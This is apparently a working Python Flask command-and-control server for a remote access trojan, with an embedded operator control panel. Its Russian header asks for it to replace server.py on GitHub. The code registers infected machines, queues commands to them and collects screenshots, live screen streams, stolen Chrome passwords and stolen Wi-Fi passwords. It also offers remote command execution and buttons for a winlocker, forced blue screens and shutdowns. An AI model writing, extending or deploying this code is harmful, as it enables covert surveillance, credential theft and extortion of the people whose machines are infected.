# =====================================================================
# СЕРВЕР - ПОЛНЫЙ ФИКС
# Замени server.py на GitHub
# =====================================================================
from flask import Flask, request, jsonify
import time
import base64
import threading

app = Flask(__name__)

clients = {}
commands = {}
notifications = []

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    client_id = str(int(time.time() * 1000))
    clients[client_id] = {
        "hostname": data.get("hostname"),
        "username": data.get("username"),
        "os": data.get("os"),
        "ip": request.remote_addr,
        "first_seen": time.strftime("%H:%M:%S"),
        "last_seen": time.time(),
        "last_screenshot": "",
        "sysinfo": {},
        "chrome_data": "",
        "wifi_data": "",
        "exec_result": "",
        "streaming": False
    }
    commands[client_id] = []
    notifications.append(f"🟢 {data.get('hostname')} ({data.get('username')}) connected! IP: {request.remote_addr}")
    return jsonify({"id": client_id})

@app.route('/data/<client_id>', methods=['POST'])
def receive_data(client_id):
    if client_id in clients:
        data = request.json
        data_type = data.get("type")
        
        if data_type in ["screenshot", "stream_frame"]:
            clients[client_id]["last_screenshot"] = data.get("data", "")
        elif data_type == "sysinfo":
            clients[client_id]["sysinfo"] = data.get("data", {})
        elif data_type == "chrome_passwords":
            clients[client_id]["chrome_data"] = data.get("data", "")
        elif data_type == "wifi_passwords":
            clients[client_id]["wifi_data"] = data.get("data", "")
        elif data_type == "exec_result":
            clients[client_id]["exec_result"] = data.get("data", "")
        
        clients[client_id]["last_seen"] = time.time()
    return jsonify({"status": "ok"})

@app.route('/screenshot/<client_id>')
def get_screenshot(client_id):
    if client_id in clients and clients[client_id].get("last_screenshot"):
        try:
            img_data = base64.b64decode(clients[client_id]["last_screenshot"])
            return img_data, 200, {'Content-Type': 'image/jpeg', 'Cache-Control': 'no-cache, no-store, must-revalidate'}
        except:
            pass
    return "No screenshot", 404

@app.route('/command/<client_id>', methods=['GET'])
def send_command(client_id):
    if client_id in commands and commands[client_id]:
        return jsonify(commands[client_id].pop(0))
    return jsonify({"command": "ping"})

@app.route('/clients', methods=['GET'])
def get_clients():
    result = {}
    for cid, info in clients.items():
        if time.time() - info["last_seen"] < 60:
            result[cid] = {
                "hostname": info["hostname"],
                "username": info["username"],
                "os": info["os"],
                "ip": info.get("ip", ""),
                "has_screenshot": bool(info.get("last_screenshot")),
                "sysinfo": info.get("sysinfo", {}),
                "chrome_data": info.get("chrome_data", ""),
                "wifi_data": info.get("wifi_data", ""),
                "exec_result": info.get("exec_result", ""),
                "streaming": info.get("streaming", False)
            }
    return jsonify(result)

@app.route('/send_command/<client_id>', methods=['POST'])
def add_command(client_id):
    if client_id in commands:
        cmd = request.json
        commands[client_id].append(cmd)
        if cmd.get("command") == "stream_start":
            clients[client_id]["streaming"] = True
        elif cmd.get("command") == "stream_stop":
            clients[client_id]["streaming"] = False
        elif cmd.get("command") == "lock":
            for _ in range(3):
                commands[client_id].append({"command": "lock"})
        elif cmd.get("command") == "winlocker":
            for _ in range(3):
                commands[client_id].append({"command": "winlocker"})
    return jsonify({"status": "ok"})

@app.route('/notifications')
def get_notifications():
    global notifications
    result = notifications[-10:]
    return jsonify(result)

@app.route('/clear_notifications')
def clear_notifications():
    global notifications
    notifications = []
    return jsonify({"status": "ok"})

@app.route('/')
def home():
    return """
<!DOCTYPE html>
<html>
<head>
    <title>Control Panel</title>
    <meta charset="UTF-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0f1923; color: #c9d1d9; font-family: 'Segoe UI', Arial; height: 100vh; display: flex; }
        
        .sidebar { width: 260px; background: #1a2733; border-right: 1px solid #2d3a4a; display: flex; flex-direction: column; }
        .sidebar-header { padding: 15px; border-bottom: 1px solid #2d3a4a; }
        .sidebar-header h2 { color: #4fc3f7; font-size: 16px; }
        .sidebar-header .status { color: #81c784; font-size: 11px; margin-top: 3px; }
        
        .notifications { max-height: 120px; overflow-y: auto; padding: 8px; border-bottom: 1px solid #2d3a4a; }
        .notification { background: #0f1923; padding: 6px 8px; margin-bottom: 4px; border-radius: 4px; font-size: 10px; color: #81c784; border-left: 2px solid #81c784; }
        
        .client-list { flex: 1; overflow-y: auto; padding: 8px; }
        .client-item { background: #0f1923; border: 1px solid #2d3a4a; border-radius: 8px; padding: 10px; margin-bottom: 6px; cursor: pointer; transition: all 0.2s; }
        .client-item:hover, .client-item.active { border-color: #4fc3f7; background: #1a2733; }
        .client-item .name { color: #4fc3f7; font-weight: 600; font-size: 13px; }
        .client-item .info { color: #8b949e; font-size: 10px; margin-top: 3px; }
        .client-item .dot { width: 7px; height: 7px; background: #81c784; border-radius: 50%; display: inline-block; margin-right: 5px; }
        .client-item .live-badge { background: #ef5350; color: #fff; font-size: 9px; padding: 1px 5px; border-radius: 3px; margin-left: 5px; animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0.5; } }
        
        .main-content { flex: 1; display: flex; flex-direction: column; }
        
        .toolbar { background: #1a2733; padding: 8px 15px; display: flex; gap: 5px; flex-wrap: wrap; border-bottom: 1px solid #2d3a4a; }
        .toolbar button { background: #212d3a; color: #4fc3f7; border: 1px solid #2d3a4a; padding: 6px 10px; border-radius: 5px; cursor: pointer; font-size: 11px; transition: all 0.2s; }
        .toolbar button:hover { background: #4fc3f7; color: #0f1923; }
        .toolbar button.danger { color: #ef5350; border-color: #ef5350; }
        .toolbar button.danger:hover { background: #ef5350; color: #fff; }
        .toolbar button.green { color: #81c784; border-color: #81c784; }
        .toolbar button.green:hover { background: #81c784; color: #0f1923; }
        
        .content-area { flex: 1; display: flex; padding: 8px; gap: 8px; overflow: hidden; }
        
        .panel { background: #1a2733; border-radius: 8px; border: 1px solid #2d3a4a; }
        .screenshot-panel { flex: 1; display: flex; align-items: center; justify-content: center; overflow: hidden; position: relative; }
        .screenshot-panel img { width: 100%; height: 100%; object-fit: contain; }
        .placeholder { color: #455a64; font-size: 14px; text-align: center; }
        
        .info-panel { width: 350px; padding: 15px; overflow-y: auto; }
        .info-panel h3 { color: #4fc3f7; font-size: 13px; margin-bottom: 8px; }
        .info-row { display: flex; padding: 4px 0; border-bottom: 1px solid #1a2733; font-size: 11px; }
        .info-label { color: #8b949e; width: 90px; flex-shrink: 0; }
        .info-value { color: #c9d1d9; word-break: break-all; }
        pre { background: #0f1923; padding: 8px; border-radius: 5px; font-size: 10px; color: #81c784; white-space: pre-wrap; max-height: 200px; overflow-y: auto; margin-top: 5px; }
        
        .console-panel { width: 300px; background: #0d1117; display: flex; flex-direction: column; }
        .console-header { padding: 6px 12px; font-size: 10px; color: #4fc3f7; border-bottom: 1px solid #2d3a4a; }
        .console-output { flex: 1; overflow-y: auto; padding: 6px; font-family: 'Consolas', monospace; font-size: 10px; color: #81c784; }
        .console-input { display: flex; border-top: 1px solid #2d3a4a; }
        .console-input input { flex: 1; background: #0d1117; border: none; color: #81c784; padding: 6px; font-family: 'Consolas', monospace; font-size: 10px; outline: none; }
        .console-input button { background: #4fc3f7; color: #0f1923; border: none; padding: 6px 12px; cursor: pointer; font-weight: 600; font-size: 10px; }
        .log-entry { padding: 1px 0; font-size: 10px; }
        .log-entry .time { color: #4fc3f7; margin-right: 4px; }
    </style>
</head>
<body>
    <div class="sidebar">
        <div class="sidebar-header">
            <h2>⬡ CONTROL PANEL</h2>
            <div class="status">● Server Online</div>
        </div>
        <div class="notifications" id="notifications"></div>
        <div class="client-list" id="clientList">
            <div class="placeholder">Waiting...</div>
        </div>
    </div>
    
    <div class="main-content">
        <div class="toolbar">
            <button onclick="sendCmd('screenshot')">📸 Screenshot</button>
            <button class="green" onclick="startStream()">📡 Stream</button>
            <button class="danger" onclick="sendCmd('stream_stop')">⏹ Stop</button>
            <button onclick="sendCmd('sysinfo')">💻 SysInfo</button>
            <button onclick="sendCmd('steal_chrome')">🔑 Chrome</button>
            <button onclick="sendCmd('steal_wifi')">📶 WiFi</button>
            <button class="green" onclick="sendCmd('lock')">🔒 Lock</button>
            <button onclick="sendCmd('unlock')">🔓 Unlock</button>
            <button class="danger" onclick="sendCmd('shutdown')">⏻ Off</button>
            <button class="danger" onclick="sendCmd('restart')">🔄 Reboot</button>
            <button onclick="sendMsg()">💬 Msg</button>
            <button class="danger" onclick="sendCmd('winlocker')">🚫 WinLock</button>
            <button class="danger" onclick="sendCmd('bsod')">⚠ BSOD</button>
        </div>
        
        <div class="content-area">
            <div class="panel screenshot-panel" id="screenPanel">
                <div class="placeholder">Select client → Screenshot</div>
            </div>
            
            <div class="panel info-panel" id="infoPanel">
                <h3>💻 System Information</h3>
                <div id="sysinfoContent"><div class="placeholder">Click SysInfo</div></div>
                <h3 style="margin-top:10px;">🔑 Chrome Passwords</h3>
                <pre id="chromeContent">Click Chrome button</pre>
                <h3 style="margin-top:10px;">📶 WiFi Passwords</h3>
                <pre id="wifiContent">Click WiFi button</pre>
            </div>
            
            <div class="panel console-panel">
                <div class="console-header">📋 Console</div>
                <div class="console-output" id="console"></div>
                <div class="console-input">
                    <input type="text" id="cmdInput" placeholder="cmd..." onkeypress="if(event.key==='Enter')execCmd()">
                    <button onclick="execCmd()">▶</button>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        let selectedClient = null;
        let streamInterval = null;
        
        function log(msg) {
            let t = new Date().toLocaleTimeString();
            let c = document.getElementById('console');
            c.innerHTML += `<div class="log-entry"><span class="time">[${t}]</span>${msg}</div>`;
            c.scrollTop = c.scrollHeight;
        }
        
        function updateAll() {
            fetch('/clients').then(r => r.json()).then(data => {
                let html = '';
                for(let id in data) {
                    let c = data[id];
                    let active = selectedClient === id ? ' active' : '';
                    let live = c.streaming ? '<span class="live-badge">LIVE</span>' : '';
                    html += `<div class="client-item${active}" onclick="selectClient('${id}')">
                        <div class="name"><span class="dot"></span>${c.hostname}${live}</div>
                        <div class="info">👤 ${c.username} | 🌐 ${c.ip} | 💻 ${c.os}</div>
                    </div>`;
                }
                document.getElementById('clientList').innerHTML = html || '<div class="placeholder">No clients</div>';
                
                if(selectedClient && data[selectedClient]) {
                    let c = data[selectedClient];
                    if(c.has_screenshot) {
                        document.getElementById('screenPanel').innerHTML = `<img src="/screenshot/${selectedClient}?t=${Date.now()}" onerror="this.parentElement.innerHTML='<div class=placeholder>Error loading</div>'">`;
                    }
                    if(c.sysinfo && Object.keys(c.sysinfo).length > 0) {
                        let h = '';
                        for(let k in c.sysinfo) h += `<div class="info-row"><span class="info-label">${k}:</span><span class="info-value">${c.sysinfo[k]}</span></div>`;
                        document.getElementById('sysinfoContent').innerHTML = h;
                    }
                    if(c.chrome_data) document.getElementById('chromeContent').textContent = c.chrome_data;
                    if(c.wifi_data) document.getElementById('wifiContent').textContent = c.wifi_data;
                }
            });
            
            fetch('/notifications').then(r => r.json()).then(data => {
                let h = '';
                data.forEach(n => h += `<div class="notification">${n}</div>`);
                document.getElementById('notifications').innerHTML = h;
            });
        }
        
        function selectClient(id) {
            selectedClient = id;
            log(`Selected: ${id}`);
            updateAll();
        }
        
        function sendCmd(command) {
            if(!selectedClient) { alert('Select client!'); return; }
            fetch('/send_command/' + selectedClient, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({command: command})
            });
            log(`Sent: ${command}`);
            if(command === 'screenshot') setTimeout(updateAll, 2000);
            if(command === 'sysinfo') setTimeout(updateAll, 3000);
            if(command === 'steal_chrome') setTimeout(updateAll, 3000);
            if(command === 'steal_wifi') setTimeout(updateAll, 3000);
        }
        
        function startStream() {
            if(!selectedClient) { alert('Select client!'); return; }
            sendCmd('stream_start');
            log('Stream started');
            if(streamInterval) clearInterval(streamInterval);
            streamInterval = setInterval(() => {
                sendCmd('screenshot');
                setTimeout(updateAll, 1500);
            }, 2000);
        }
        
        function execCmd() {
            let cmd = document.getElementById('cmdInput').value;
            if(cmd && selectedClient) {
                fetch('/send_command/' + selectedClient, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({command: 'exec', cmd: cmd})
                });
                log(`Exec: ${cmd}`);
                document.getElementById('cmdInput').value = '';
                setTimeout(updateAll, 2000);
            }
        }
        
        function sendMsg() {
            if(!selectedClient) { alert('Select client!'); return; }
            let msg = prompt('Message:');
            if(msg) {
                fetch('/send_command/' + selectedClient, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({command: 'message', text: msg})
                });
                log(`Msg: ${msg}`);
            }
        }
        
        setInterval(updateAll, 2000);
        updateAll();
        log('Panel ready');
    </script>
</body>
</html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
